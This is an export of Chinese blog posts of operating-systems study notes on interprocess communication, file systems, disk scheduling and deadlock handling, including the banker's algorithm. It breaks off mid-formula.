无限容量：具有无限容量的队列，发送者永远不会被迫阻塞 至此整节围绕对消息传递功能的三个方面做了介绍：\n直接或间接通信 同步或异步通信 显式缓冲 Signal 信号是一种有限IPC形式，通常用于Unix、类Unix、POSIX的操作系统。信号是异步的，发送信号后，操作系统会中断进程正常的执行流程来传递信号，如果进程注册过相关信号处理逻辑，则执行对应代码，否则按照POSIX标准执行相关操作。\n信号类似于中断，与中断的区别是，中断是由CPU调解，内核处理，信号是由内核调解，用户程序处理\n接收到信号时会发生什么?\ncatch: 指定信号处理函数被调用 ignore: 依靠操作系统的默认操作(abort，memory dump，suspend or resume process) mask: 屏蔽信号因此不会传送(可能是暂时的，当处理同样类型的信号) 信号的缺点\n不能传输要交换的任何数据 信号的实现：\n应用程序注册信号处理函数，作为系统调用发给操作系统 产生了信号，操作系统返回为信号处理函数入口 通过修改 Stack ，将后续的执行改为信号处理函数的入口 Pipe 管道是用来数据交换的，是进程之间最简单的通讯方式。通过将一个命令的输出，作为另一个命令的输入来实现的\nMessage Queue 消息队列是按FIFO 无界 队列，克服了管道的一些缺点：\n无需父进程建立通道 Pipe是数据流，MQ是一个结构化数据 MQ和Pipe一样是 Bounded Buffer Share Memory 共享内存是一种直接通信方式，对于进程来说，每个进程是私有地址空间；在每个地址空间内，明确地设置了共享内存段。\n优点：共享内存速度快更快，不需要系统调用并且以正常的内存速度进行访问。\n缺点\n设置更复杂\n需要保障进程间同步机制 无法在在多台计算机上正常工作\n如何实现内存共享\n如图所示，可以将共享内存映射到两个不同的进程内存段之间\nOther IPC Socket被定义为通信中的端点，是指一对进程通过网络使用一对套接字进行通信，套接字由连接的端口号和 IP 地址组成，通常为C/S架构。\nUNIX Domain Socket 是基于Socket网络通信架构的基础上发展出的一种IPC机制，相比于Socket，UNIX Domain Socket更高效。\nIP Socket 是可以用在同一台主机的进程间通讯（通过loopback地址127.0.0.1），但 UNIX Domain Socket ，不是使用底层网络协议（不需要打包拆包、计算校验和、维护序号和应答等），所有通信都完全发生在操作系统内核中。通过使用文件系统，是两个进程可以同时打开一个UDS进行通信\n一些其他的IPC\nRPC Remote Procedure Calls 基于Socket的 FTP HTTP等 Reference\nProcesses\nIPC\nUNIX Domain Socket\n","permalink":"https://www.oomkill.com/2022/05/ch12-ipc/","summary":"","title":"ch12 进程间通讯"},{"content":"Overview 文件系统和文件 文件系统: 一种用于持久性存储的系统抽象，决定了辅存中的内容如何组织与存储的抽象概念\n文件：文件系统中的一个单元的相关数据在操作系统中的抽象，展现给用户的抽象概念\n文件系统的功能：\n分配文件磁盘空间 管理文件块(哪一块属于哪一个文件) 管理空闲空间(哪一块是空闲的) 分配算法(策略) 管理文件集合 定位文件及其内容 命名：通过名字找到文件的接口 最常见：分层文件系统 文件系统类型(组织文件的不同方式) 提供的便利及特征 保护：分层来保护数据安全 可靠性，持久性：保持文件的持久即使发生崩溃,媒体错误,攻击等 为什么需要文件系统：\n如果将文件放入一个房间中，整个房间都是堆积的文件\n有了文件系统的存在将会改变一切\n空间管理、元数据、数据加密、文件访问控制和数据完整性等等都是文件系统的职责。\n文件属性 文件具有名称和数据，还存储文件创建日期和时间、当前大小、上次修改日期等元信息。所有这些信息都称为文件系统的属性。常见的文件属性有\n名称：它是以人类可理解的形式。 标识符：每个文件都由文件系统中的唯一标记号标识，称为标识符。 位置：设备上的文件位置。 类型：支持各种类型文件的系统需要此属性。 大小：当前文件大小的属性。 保护：分配和控制读、写和执行文件的访问权限。 时间、日期和安全：用于对文件的保护、安全，也用于监控 文件描述符 文件头 File Header；类似于Unix的 inode，在存储元数据中保存了每个文件的信息，保存文件的属性，跟踪哪一块存储块属于逻辑上文件结构的哪个偏移\n文件描述符 （file-descriptor）；是唯一标识操作系统中打开文件的数字（整形），用于用户和内核空间之间的接口，以识别 文件/Socket 资源。因此，当使用 open() 或 socket()（与内核接口的系统调用）时，会得到一个文件描述符，一个整数。因此，如果直接与内核交互，使用系统调用 read(), write() 等 close()。使用的是一个文件描述符句柄。\n在 C 语言中 stdin，stdout、 和 stderr ，在 UNIX 中分别映射到文件描述符 0 1 2\nf = open(name, flag); ... ... = read(f, ...); ... close(f); 内核跟踪每个进程打开的文件：\n操作系统为每个进程维护一个打开文件表 一个打开文件描述符是这个表中的索引 描述符由唯一的非负整数表示，例如 0、12 或 567。系统上每个打开的文件至少存在一个文件描述符 如果对文件需要更好的管理，就需要元数据来管理打开文件:\n文件指针：指向最近的一次读写位置，每个打开了这个文件的进程都这个指针\n文件打开计数：记录文件打开的次数； 当最后一个进程关闭了文件时，允许将其从打开文件表中移除\n文件磁盘位置：缓存数据访问信息\n访问权限：每个程序访问模式信息\n从用户角度来看：文件是持久的数据结构\n系统访问接口: 字节的集合(UNIX) 系统不会关心你想存储在磁盘上的任何的数据结构 操作系统内部视角： 块的集合（块是逻辑转换单元，而扇区是物理转换单元） 块大小\u0026lt;\u0026gt; 扇区大小：在UNIX中，块的大小是 4KB 空间管理 在系统层面上来看，存储设备在被划分为称为扇区的固定大小的块；扇区是存储设备上的最小存储单元 ，介于 512 bytes 和 4096bytes 之间；所有的操作都是操作磁盘块，读写1bytes也是对整个磁盘块的读写。\n文件系统使用的是块，块是物理扇区的抽象\n用户怎么访问文件：在系统层面需要知道用户的访问模式\n顺序访问：按字节依次读取 几乎所有的访问都是这种方式 随机访问：从中间读写 不常用,但是仍然重要，如：虚拟内存支持文件，内存页存储在文件中； 更加快速，不希望获取文件中间的内容的时候也必须先获取块内所有字节 内容访问：通过特征（索引） 更多是数据库形式的存在；通过index，找到包含关系的文件 文件访问控制 多用户操作系统中的文件共享是很必要的，不是每个人都能够删除或修改他们没有权限的文件。\n有关用户权限和文件所有权的数据在不同的操作系统上有不同的格式：\n类 Unix被存储为访问控制列表 ；Access-Control List （ACL） Windows 上被存储为访问控制条目；Access-Control Entries (ACE) 谁能够获得哪些文件的哪些访问权限\n访问模式: 读,写,执行,删除,列举等 文件访问控制列表(ACL)：\n\u0026lt;文件实体, 权限\u0026gt; UNIX模式：\n\u0026lt;用户|组|物主,读|写|可执行\u0026gt; 用户ID识别用户；表明每个用户所允许的权限及保护模式 组ID允许用户组成组，并指定了组访问权限 多用户下，如何同时访问共享文件：\n和进程同步算法相似\n因磁盘IO和网络延迟而设计简单\n文件共享的一致性语义 Consistency Semantics\nUNIX文件系统语义 Unix Semantics ：\n对打开文件的写入内容立即对其他打开同一文件的其他用户可见\n共享文件指针允许多用户同时读取和写入文件\n会话语义 Session Semantics：\n用户对文件的写入对其他用户不可见。 文件关闭后，更改仅对新会话可见。 锁:\n一些操作系统和文件系统提供该功能 目录 目录是磁盘上的一个位置，是一种特殊的文件；用于对文件分层。文件夹和目录是可互换的术语。\n目录的特点：\n目录是一类特殊的文件：每个目录都包含了一张表 \u0026lt;name, pointer to file header\u0026gt;\n目录和文件的树形结构：早期的文件系统是扁平的(只有一层目录)\n层次名称空间：\n名字解析：逻辑名字转换成物理资源（如文件）的过程:\n在文件系统中：到实际文件的文件名(路径) 遍历文件目录直到找到目标文件 举例：解析 /bin/ls 读取root的文件头(在磁盘固定位置) 读取root的数据块: 搜索bin项 读取bin的文件头 读取bin的数据块: 搜索ls项 读取ls的文件头 当前工作目录：当前目录的内容存储在内存中可以快速的指向一个目录\n每个进程都会指向一个文件目录用于解析文件名 允许用户指定相对路径来代替绝对路径 单级目录 单级目录 Single-Level Directory；单级目录理解起来比较简单，单级目录中所有文件都包含在同一目录中，必须具有唯一的名称\n两级目录 两级目录 Two-Level Directory；两级目录通常为不同用户的自己的目录 User File Director UDF，文件名只需在指定目录下唯一即可。\n树形目录 树形目录 Tree-Structured Directories；通常是指深度大于2的目录，在此结构中，每个文件都有一个唯一的路径\n文件别名 无环图目录 无环图目录 Acyclic-Graph Directories；也被称作为别名 Alias，是指在目录结构中一个文件有多个绝对位置（绝对路径）。UNIX中提供了两种类型的链接来实现该类型：\n硬链接 hard link：硬链接会创建新的文件，指向同一个inode；在删除一个文件时，会删除一个指向底层 inode的链接。当所有指向该 inode 的链接都被删除，inode才会被删除（同一文件系统中的普通文件） 每个文件都有引用计数器，以跟踪当前有多少文件引用该文件。每当删除其中一个引用（有别名的文件）时，计数器就会减少，当它达到零时，可以回收磁盘空间。 符号链接 symbolic link；也称软连接，是一个特殊文件，包含被链接文件的信息，可以是目录或文件。 符号链接在删除或被移动时 找到所有链接并同时修改 符号链接悬空，Dangling Pointer；不在有效 Windows中仅支持符号链接，称为快捷方式\n通用图目录 通用图目录 General Graph Directory ；是一种允许循环的目录；上述无环目录中是会进入无限循环\n通用图目录比其他类型目录更佳灵活，最大问题是计算大小时的难度。通用图目录实现常见的是通过线性列表或哈希表：\n线性列表：将所有文件保存在一个目录中，类似一个单链表。每个文件都包含一个数据块指向指针和目录中的下一个文件。 哈希表：目录中对于每个文件，都会生成一个键值对，将其存入哈希表中。借助文件名的哈希函数，我们可以确定存储在目录中的各个文件 key 和其指针 key points 图：通用图目录结构\n文件系统挂载 在类Unix系统中，VFS 会为每个分区或可移动存储设备分配一个设备 ID 如 dev/disk1s1；然后，创建一个虚拟目录树 ，并将每个设备的内容作为单独的目录放在该目录树下。\n将目录分配给存储设备的行为称为挂载 mount，被分配的目录称为挂载点\n一个文件系统需要先挂载才能被访问 一个未挂载的文件系统被挂载在挂载点上 文件系统种类 磁盘文件系统：文件存储在数据存储设备上,如磁盘; 例如: FAT，NTFS，ext2 3， ISO9660等\n数据库文件系统：文件根据其特征是可被寻址的; 例如: WinFS\n日志文件系统: 记录文件系统的修改,事件; 例如: journaling file system\n网络，分布式文件系统：例如：NFS，SMB，AFS，GFS\n虚拟文件系统\n虚拟文件系统 虚拟文件系统 Virtual File Systems VFS；是对多种类型文件系统提供统一的通用API，使得在上层软件中，可以用单一的方式实现不同底层的文件系统。\n虚拟文件系统的功能：\n提供相同的文件和文件系统接口 管理所有文件和文件系统关联的数据结构 高效查询例程，遍历文件系统 与特定文件系统模块的交互 VFS除了统一的API外，还提供了唯一标识符 vnode；对于类UNIX操作系统中，inode是惟一的，并不会跨网络\nLinux中虚拟文件系统的对象类型：\ninode：代表单个文件 存储文件的元信息（许可，拥有者，大小，数据库位置等） 一个文件对应一个inode，每个inode都由一个inode编号唯一标识 一个inode通常对应于存储在磁盘上的一个文件控制块 file：代表一个打开的文件 存储进程和打开文件之间交互的信息。这个信息只存在于内核空间，不保存在磁盘上。 superblock：卷控制块代表一个文件系统 每个文件系统一个 文件系统详细信息 块，块大小，空余块，计数，指针等 dentry：代表目录项 dirctory entry 用于将一个inode（文件）与一个目录关联 将目录项数据结构及树形布局编码成树形数据结构 指向文件控制块，父节点，项目列表等 数据块缓存 打开文件的数据结构 内存中文件系统结构。(a) 文件打开 \u0026nbsp;\u0026nbsp;\u0026nbsp;(b) 文件读取 由图可知，当一个文件在程序中被访问时（创建、打开），open() 系统调用从磁盘读入FCB信息，并将其存储在系统打开文件表中。一个条目被添加到每个进程的打开文件表中，这个索引引用的是系统范围的打开文件表，并且进程表的索引由 open() 这个系统调用返回。这个索引称为文件描述符， Windows中为文件句柄。\n如果有多个进程打开同一个文件，此时系统表中的计数器会递增。对应打开文件表条目会引用到系统表中\n文件被关闭时，每个进程的打开文件表的条目被释放，系统表中的计数器递减。如果计数器到零，则系统表也被释放。\n打开文件描述：\n每个被打开的文件一个\n文件状态信息\nFCB：目录项，当前文件指针，文件操作设置等\n打开文件表：\n一个进程一个\n一个系统级的\n每个卷控制块也会保存一个列表\n所以如果有文件被打开将不能被卸载\n一些操作系统和文件系统提供该功能\n调节对文件的访问\n强制 - 根据锁保持情况和需求拒绝访问 劝告 - 进程可以查找锁的状态来决定怎么做 文件分配 在文件分配中，存在一些问题\n大多数文件很小\n需要对小文件支持 块的空间不能设置太小 一些文件却很大\n必须支持大文件 大文件需要高效访问 磁盘的分配主要有三种方式：连续 contiguous、链式 linked 、索引 indexed ；分配指标必须遵循 高效的存储利用，与访问速度的表现\n连续分配 连续分配 （Contiguous Allocation）是指文件的所有块连续地保存在一起\n连续分配的特点：\n只需要一个起始块，与长度\n性能非常快，读取同一文件的连续块不需要移动磁头；或仅需要移动一小块到达相邻柱面\n连续分配存在的问题：固定递归存储时不会出现问题，当文件增长或创建时文件的确切大小未知，会出现问题：\n碎片：\n过高估计文件最终的大小会增加外部碎片从而浪费浪费磁盘空间\n文件增长超出其最初分配的空间，过低预估则可能需要移动文件位置或中止进程\n文件增长问题：\n如果一个文件初始分配大小很大，并长期没有写入，在文件填满时，很多空间将变得不可用 链式分配 链式分配（ Linked Allocation ）是指文件按照数据链表方式存储，并以每个链接消耗的存储空间为代价\n链式分配的特点：\n无外部碎片，无需预先知道文件大小，并支持文件的动态增长 链式分配的不足：\n无法实现高效的随机访问；链式访问仅可以串行访问文件，必须从每个位置的列表头开始 可靠性：指针丢失或损坏 索引分配 索引分配（Indexed Allocation）是指将每个文件的索引组合在一个公共块上，每个索引项指向了一个数据块\n索引分配的特点：基本包含链式分配和连续分配的所有优点\n索引分配的不足：会浪费一部分磁盘空间\n无论文件大小，存储索引都有一定开销（文件大小\u0026lt;索引大小） 单个索引块不能保存大文件的所有指针 对于单个索引块不能保存大文件的所有指针这个问题，一般情况下有下述解决方案\n链式索引块模式 Linked Scheme：索引块为一个磁盘块，第一个索引块包含一些头信息、前 N 个块地址；还包含指向其他链接索引块的指针 多级索引 Multi-Level Index：类似于多级页表，第一个索引块包含一组指向二级索引块的指针，而二级索引块又包含指向实际数据块的指针 联合模式 Combined Scheme： 图：索引分配 图：多级索引 Reference\nmultilevel-indexes\n空闲空间管理 空闲空间管理只是磁盘管理中，需要追踪和分配对空闲空间部分的管理，对于空闲空间的管理的表现是位图 bitmap；即通过位向量来标记数据块的使用情况\n其他管理空闲空间的方式：\n链表：链表也可以作为管理空闲块的一种方式 分组：将空闲块存储在第一个空闲块中，前 n-1 个空闲块是空闲的，最后一个包含下一个分组 计数：存储一个磁盘块的地址和之后n个空闲块的数量 Reference\n一些空闲空间管理的测试题\n多磁盘管理 RAID 冗余磁盘阵列 **RAID **（redundant array of independent disks）；是一种小磁盘分区组成大分区的一种解决方案，一种磁盘管理技术\nRAID的工作原理 RAID 的工作原理是将数据分别放置在多个磁盘上，并允许I/O操作以平衡的方式，从而提高磁盘性能\nRAID Controller RAID 控制器是用于管理存储阵列中的硬盘驱动器的设备，是操作系统和物理磁盘中间的一个抽象层，将磁盘表示为逻辑单元。\nRAID控制器分为软RAID和硬RAID\n硬RAID Hardware RAID：物理控制器管理整个磁盘阵列；如主板或RAID卡 软RAID Software RAID：使用硬件资源来管理磁盘阵列；如CPU、内存；软RAID可能无法实现性能提升，反而影响性能 RAID级别 RAID0 RAID0（无容错的条带化磁盘阵列），是将数据体划分为块并将数据块分布在独立磁盘冗余阵列中的多个存储设备中，但不提供容错。\nRAID1 RAID1又称为磁盘镜像 mirroring，将数据复制到两个或更多磁盘，由至少两个数据存储驱动器组成，读性能提升，写性能与单磁盘相同。RAID1提供了全面的数据保护\nRAID5 RAID0（基于奇偶校验块的条带化磁盘阵列）；它使用类似于 RAID0 的分布式数据存储，但通过包含写入不同阵列磁盘的冗余信息（奇偶校验码）来提高数据存储的可靠性。RAID 5 至少需要三个磁盘，但出于性能原因，通常建议使用至少五个磁盘。\nRAID 10 RAID 0+1是结合 RAID 1 和 RAID 0的一种模式，通常称为 RAID 10；RAID10需要至少四个磁盘；通过跨镜像的条带化保存数据，只要每个镜像对中的一个磁盘正常，那么数据就正常\n磁盘调度 磁盘调度是指在操作系统层面重新组织IO请求的顺序，来有效的减少磁盘访问开销。\n在传统磁盘中由多个盘面组成，每个盘面被臂组件上的磁盘头来通过旋转读取，通过所希望的扇区开始\n在操作中，磁盘会告诉旋转例如 7200RPM（revolutions per minute）（实际读写速度120 MB/s ）。数据从磁盘传输到计算机的速率由几个步骤组成：\n寻道时间 seek time：是将磁头从一个柱面移动到另一个柱面所需的时间，以及磁头在移动后稳定下来所需的时间。是过程中最慢的步骤，也是整体传输速率的主要瓶颈。 旋转延迟 rotational latency：扇区从开始处到目的处所需时间 传输速率 transfer rate：数据从磁盘移动到计算机所需的时间 $access\\ time=SK+RL+TR$\n$T_a$ access time 访问时间 $T_s$ seek time 寻址时间 $T_r$ rotational latency 旋转延迟 $T$ transfer time 传输速率 $b$ transfer b bytes 传输位 $N $ bytes per track 每轨存多少字节 $r$ Rotational speed $\\frac{1}{r}$ 旋转一周的时间 $\\frac{1}{2r}$ 平均旋转延迟，旋转一周时间再取一半 $\\frac{b}{rN}$ 数据访问时间 那么 传输速率 $T = \\frac{b}{rN}$\n平均访问时间为 $T_a = T_s + \\frac{1}{2r} + \\frac{b}{rN}$\n如：$T_s = 2ms$，$r=10000rpm$，512B扇区大小，每轨320个扇区， 1.3 MB的文件大小\n转一圈的时间：RPM=10000时，每6毫秒转一圈：$\\frac{1}{r} = \\frac{60}{10000}=0.006s = 6ms$\n一个文件有多少扇区：$\\frac{1.3MB}{512} = \\frac{1300000}{512}=2540$\n一共多少轨道：$2540\\div320=8$\n通过磁道 tracks 访问需要耗时多少？\n一个磁道要传输的数据大小：$b=512\\times320$\n每轨有多少字节：$N=512\\times320$\n$\\frac{1}{r}=6$，$\\frac{1}{2r} = 3$\n$\\frac{b}{rN}=6$ ；因$b=N$ 故$\\frac{b}{rN}=6$\n因 $T_s=2$，$Average T_r=3$，$\\frac{b}{rN}=6$ ；那么 $T_a = T_s + \\frac{1}{2r} + \\frac{b}{rN}=2+3+6=11$\n那么按轨寻址访问的总时间为：$8*11=88ms$\n通过扇区 sectors 访问需要耗时多少？\n每轨多少字节 $N=512\\times320$ 因磁轨转一圈多少时间 $\\frac{1}{r} = 6$，$\\frac{1}{2r} = 3$；每磁道耗时 $\\frac{1}{r} = \\frac{6}{320} = 0.01875ms$ 因 $\\frac{1}{r} = \\frac{6}{320}$ ；$b=512$；$N=512\\times320$；那么 $\\frac{b}{rN}=0.01875$ 那么一个扇区的时间为： 因 $T_s=2$，$Average T_r=3$，$\\frac{b}{rN}=0.01875$ b=512，N=512，$\\frac{1}{r} = 0.01875$，那么，$\\frac{b}{rN}=0.01875$ 那么 $T_a = T_s + aT_r + \\frac{n}{rN} = 2+3+0.01875 = 5.01875$ 那么总共时间为 $2540*5.01875=12748ms$ 那么就可以得出结论：\n寻道方式是性能上区别的原因 如果来回寻道，会导致性能急剧下降 对单个磁盘，会有一个IO请求数目 如果请求是随机的，那么会表现很差 磁盘调度算法 磁盘传输速度主要受寻道时间和旋转延迟的限制。当要处理多个请求时，在等待其他请求被处理时也会有一些固有的延迟。\n带宽是通过传输的数据量除以从发出第一个请求到完成最后一次传输的总时间量来衡量的\n通过以良好的顺序处理请求，可以提高带宽和访问时间。\n磁盘请求包括磁盘地址、内存地址、要传输的扇区数以及请求是读还是写。\nFCFS 先来先服务 First-Come First-Serve：\n按顺序处理请求 公平对待所有进程 在有很多进程的情况下，接近随机调度的性能 可以看到柱面 cylinder从122 到 14 在回到124摆动很巨大：\nSSTF 最短寻道优先 Shortest Seek Time First\n选择从磁臂当前位置需要移动最少的IO请求 总是选择最短寻道时间 可能会导致饥饿 由图可以看出相同的情况下SSTF将柱面移动数减少到 236 个柱面，低于**FCFS **所需的 640 个柱面。\nSCAN SCAN算法，又称电梯算法，磁臂在一个方向上移动，满足所有为完成的请求，直到磁臂到达该方向上最后的磁道，类似于在高层建筑中处理请求的电梯。\nC-SCAN Circular-SCAN，通过循环队列方式来改进 SCAN ：一旦磁臂到达磁盘的末端，它会返回到另一端而不处理任何请求，然后从磁盘的开头重新开始：\nLOOK LOOK是通过待处理请求的队列来改进SCAN，而不是磁盘序列，并且不会将磁头移向磁盘末端的距离超过必要的位置。\nN-Step LOOK or N-Step-SCAN N-Step-SCAN是将请求队列分为成长度为N的子队列，使用SCAN算法进行处理；当在一个队列的处理过程中，如果有一些新的请求到达，那么它们必须被放置在另一个队列中。\n设有从 0 到 199 编号为 200 磁道；请求顺序为， 122、90、160、24、102、89、143、18、67；$N=2$\n子队列有：\n1 = {122, 90}\n2 = {160, 24}\n3 = {102, 89}\n4 = {143, 18}\n5 = {67}\nN-step-SCAN 磁盘调度算法的吞吐量高，平均响应时间低。\nReference\nn-step-scan disk scheduling algorithm\nFSCAN FSCAN Fixed period SCAN，是 N-step-SCAN 的简化版本，FSCAN将磁盘请求队列分成两个子队列，一个是由当前所有请求磁盘I/O的进程所形成的队列，由磁盘调度按SCAN算法进行处理，在扫描期间，将新出现的请求磁盘I/O的进程放入另一个等待处理的请求队列。这样，所有的新请求都被推迟到下一次扫描时处理。\n","permalink":"https://www.oomkill.com/2022/05/ch13-file-system/","summary":"","title":"ch13 file system"},{"content":"死锁问题 死锁 deadlock；是一组阻塞的进程，每个进程都持有一个资源并等待获取另一个进程持有的资源。\n死锁的示例：交通桥\n如图所示，桥是资源，进程是车辆，两个不同方向的车辆同时占用桥，此时发生谁也过不去的情况（死锁的发生）；\n当死锁发生时，如果一辆车倒车（抢占资源和回滚）就可以解决死锁问题 死锁发生时，可能需要后退多台车辆 饥饿，而饥饿并不一定是死锁 系统模型 在正常情况下，进程必须在使用之前请求资源，并在完成后释放它，顺序如下：\n请求：如果不能立即授予请求，则进程等待，直到它需要的资源变得可用。例如，系统调用 open()、malloc()、new() 、request() 等。\n使用：进程使用资源，例如文件中读取数据；使用硬件。\n释放：进程完成后放弃资源，以便其可用于其他进程。如，close()、free()、delete() 、 release()。\n当在集合中的每个进程都在等待当前分配给集合中另一个进程的资源时，这一组进程就会发生死锁\n资源分配 通过实例来理解死锁，\n一组资源：\n${ R_1,\\ R_2,\\ R_3,\\ \u0026hellip;.,\\ R_N }$；为方形，图形内的点代表资源数量 一组进程：\n${ P_1,\\ P_2,\\ P_3,\\ \u0026hellip;.,\\ P_N }$ 请求边缘 Request Edge：进程需要一些资源，被称为请求边缘；如 $P_i\\ →\\ R_j$\n分配边缘 Assign Edge：当资源已经被分配给进程，被称为分配边缘；如 $R_j\\ →\\ P_i$\n当请求被授予时，可以通过反转方向的线将请求边缘转换为分配边缘\n类型 示意图 Process Resource $P_i$ 请求的 $R_j$ 实例 $P_i$ 持有一个 $R_j$ 的实例\n也可以说 $R_j$ 被 $P_i$ 所持有 资源分配图 资源分配图 如图所示，资源类型为：\nP = ${P_1,\\ P_2,\\ P_3}$ R = ${R_1,\\ R_2,\\ R_3,\\ R_4}$ RE = ${P_1\\ →\\ R_1,\\ P_2\\ →\\ R_3}$ AE = ${R_1\\ →\\ P_2,\\ R_2\\ →\\ P_2,\\ R_2\\ →\\ P_1,\\ R_3\\ →\\ P_3}$ ${P_1}$ 持有 ${R_2}$ 等待 ${R_1}$ ${P_2}$ 持有 ${R_1}$ 和 ${R_2}$ 等待 ${R_3}$ ${P_3}$ 持有 ${R_3}$ 死锁示意图 资源分配图不包含循环，则不会死锁；如果有向图为环形，则为死锁，例如\n环形有向图 死锁示意图资源类型为：\nP = ${P_1,\\ P_2,\\ P_3}$ R = ${R_1,\\ R_2,\\ R_3,\\ R_4}$ RE = ${P_1\\ →\\ R_1,\\ P_2\\ →\\ R_3,\\ P_3\\ →\\ R_2 }$ AE = ${R_1\\ →\\ P_2,\\ R_2\\ →\\ P_2,\\ R_2\\ →\\ P_1,\\ R_3\\ →\\ P_3}$ ${P_1}$ 持有 ${R_2}$ 等待 ${R_1}$ ${P_2}$ 持有 ${R_1}$ 和 ${R_2}$ 等待 ${R_3}$ ${P_3}$ 持有 ${R_3}$ 等待 $R_2$ 这个图出现两个环形，这种情况下会发生死锁\n$P_1\\ →\\ R_1\\ →\\ P_2\\ →\\ R_3\\ →\\ P_3\\ →\\ R_2\\ →\\ P_1$ $P_2\\ →\\ R_3\\ →\\ P_3\\ →\\ R_2\\ →\\ P_2$ 有环但无死锁 有环但无死锁 有环但无死锁意图资源类型为：\nP = ${P_1,\\ P_2,\\ P_3,\\ P_4}$ R = ${R_1,\\ R_2}$ RE = ${P_1\\ →\\ R_1,\\ P_3\\ →\\ R_2 }$ AE = ${R_1\\ →\\ P_2,\\ R_1\\ →\\ P_3,\\ R_2\\ →\\ P_4,\\ R_2\\ →\\ P_1}$ ${P_1}$ 持有 ${R_2}$ 等待 ${R_1}$ ${P_2}$ 持有 ${R_1}$ ${P_3}$ 持有 ${R_1}$ 等待 $R_2$ ${P_4}$ 持有 ${R_2}$ 此图中，$P_4$ 执行完会释放 $R_2$，$R_2$会被分配给 $P_3$，这样就跳出了循环\n结论 如果图中没有循环，则无死锁 如果图中，一个资源仅包含一个实例，必然会发生死锁 如果图中，一个资源包含多个实例，则可能会发生死锁 死锁特性 必要条件 实现死锁需要四个条件： Mutual Exclusion：至少一个资源必须以不可共享的方式持有；如果任何其他进程请求此资源，则该进程必须等待资源被释放。 Hold and Wait：一个进程必须同时持有至少一个资源并等待至少一个当前被其他进程持有的资源。 No preemption：一旦进程持有资源，则该资源不能从该进程中被抢占，直到该进程自愿释放。 Circular Wait ：一组等待的进程 ${P_0,\\ P_1,\\ P_2,\\ \u0026hellip;,\\ P_N}$ 必须存在每个 $P[ i ] $ 都在等待 $P[ ( i + 1 ) % ( N + 1 )]$ 死锁处理方法 确保系统永远不会进入死锁 允许系统进入死锁状态，然后恢复 忽略这个问题，假装系统中从来没有发生死锁，用于大多数操作系统,包括UNIX 死锁预防 限制资源的申请方式\n互斥\n对于只读文件资源来说不会引起死锁 对于只允许单独访问的资源，需要互斥，如打印机 等待：必须确保进程在访问资源时，没有持有其他资源\n要求对所有进程同时请求所有资源。这种情况下当一个资源被占用，导致等待很长时间，这可能会浪费系统资源。 只有当进程能够获得旧的资源以及它请求新的资源，进程才可以执行 这种情况资源利用率低，饥饿 非抢占式：以下情况下可以防止死锁\n如果进程占有某些资源，并请求其他不能被立即分配的资源，则释放当前正占有的资源（可能资源浪费） 当请求资源不可用时，并本身属于阻塞；这时资源会被抢占，添加到进程等待资源列表中 循环等待\n对所有资源进行编号排序，并要求进程仅以严格的递增（递减）顺序请求资源（常见于嵌入式操作系统） 如：为了请求资源 $R_j$，进程必须首先释放所有的 $R_i$，使得 $i \u0026gt;= j$ 挑战性：如何确定不同资源的排序 避免死锁 死锁避免，与死锁预防的区别是，死锁预防是确保可以预防死锁必要条件的其中一个；死锁避免是确保进程不会导致死锁。\n要想防止死锁，就需要更多有关进程的信息，这样的话会导致系统资源利用率低（保守方法），根据不同的调度算法，会得到进程所需的资源的数量，还可以知道以什么顺序进行调度。\n调取器会根据资源分配状态检测将来是否出现死锁\n安全状态 如果系统可以分配所有进程的所有资源，而不进入死锁状态，则被称为安全状态。更严格来讲，存在安全的进程序列，则状态是安全的，（${P_0,\\ P_1,\\ P_2,\\ \u0026hellip;,\\ P_N }$）\n如果 $P_i$ 资源的需求不是立即可用，那么 $P_i$ 可以等到所有 $P_j$ 完成\n当 $i\u0026gt;j$ 时，$P_i$ 要求的资源能够由 $当前可用的资源+所有的\\ P_j\\ 持有的资源$ 来满足；如果 $P_i$ 完成了并释放了所有资源，那么 $P_j$ 也能够完成\n如图所示：如果不存在安全序列，则系统处于不安全状态，这可能会导致死锁。（所有安全状态都是无死锁的，但并非所有不安全状态都会导致死锁。）\n例如：考虑一个具有 12 个磁带驱动器的系统，分配如下。这是一个安全的状态吗？安全顺序是什么？\nProcess Maximum Needs Current Allocation $P_0$ 10 5 $P_1$ 4 2 $P_2$ 9 2 是安全的\n当 $t=0$ 时，$P_0$ 持有5个资源； $P_1$ 持有 2；$P_2$ 持有 2，此时是安全的； 安全顺序为：\n$P_1$ 可以分配所有的资源；$P_1\\ need = Total - Allocation = 12-9=3$，$P_1$ 需要4 ，已分配2，剩余3，可以分配给 $P_1$；当 $P_1$ 执行完成并释放，此时 $available=2+2+1 = 5$ $P_0$，可用5，已分配5，需要5；此时 $P_2$ 也可以执行；释放 $available=5+5=10$ $P_2$，可用10，已分配2，需要9；此时 $P_2$ 也可以执行；释放 $available=2+9+1=12$ 如果进程 P2 请求并被多分配一个磁带资源，会发生什么情况？\n会从安全状态变为不安全状态，$P_2$ 当前分配为3 ，此时 $P_1$ 还是可以执行，执行释放完之后，可用为4，不满足 $P_0$ 所需5 ，$P_2$ 所需的6，死锁 资源分配图 当资源类别仅具有其资源单实例，可以通过资源分配图中循环来检测死锁。这种情况下，使用声明边缘 （claim edge 根据上下文翻译的，不知道对不对），指向了在未来所需要请求的资源，用虚线表示，来避免不安全状态\n声明边缘 claim edge：未来需要请求的资源 请求边缘 request edge：请求的资源 进程在请求资源会从 claim edge 转为 request edge 进程释放资源会从 assignment edge 转为 claim edge 此方法的工作原理是，拒绝会在资源分配图中产生循环的请求，从而使声明边缘生效\n图：当生成的资源分配中会形成一个循环，此资源申请无法授予 Reference\nDeadlocks\nch7 deadlock\n银行家算法 银行家算法 The Banker\u0026rsquo;s algorithm，是一种资源分配和避免死锁的算法，是通过模拟所有资源的一种”预测“最大可能需求来为进程分配资源是否 安全；这个成为 safe state check\n为何被命名为银行家算法？ 银行家算法与银行使用相同的手法来检查资金是否可以批给贷款客户，假设一家银行有 N 个账户持有人，他们存入银行的总金额为 M。在分配任何贷款金额之前，银行会检查在从银行的总金额中减去贷款金额后，剩余的钱是否大于 M，大于 M 则分配这笔贷款是安全的，否则不是。\n而银行家算法是，在一个进程启动时，必须事先声明它可能请求的最大资源分配数，最高可达系统上可用的数量；在发出请求后，调度器确定分配给该进程资源是否会使系统处于不安全状态。如果是，则该进程等待，直到分配后系统处于安全状态。\n银行家算法的数据结构 n ：进程数\nm：资源数\n$Available[ m ]$：当前每种类型有多少资源可用。\n$Max[n][m]$：每个资源的每个进程的最大需求。\n$Allocation[n][m]$：分配给每个进程的每个资源类别的数量。\n$Need[n][m]$：每个进程每个类型所需的剩余资源。\n$Need[ i ][ j ] = 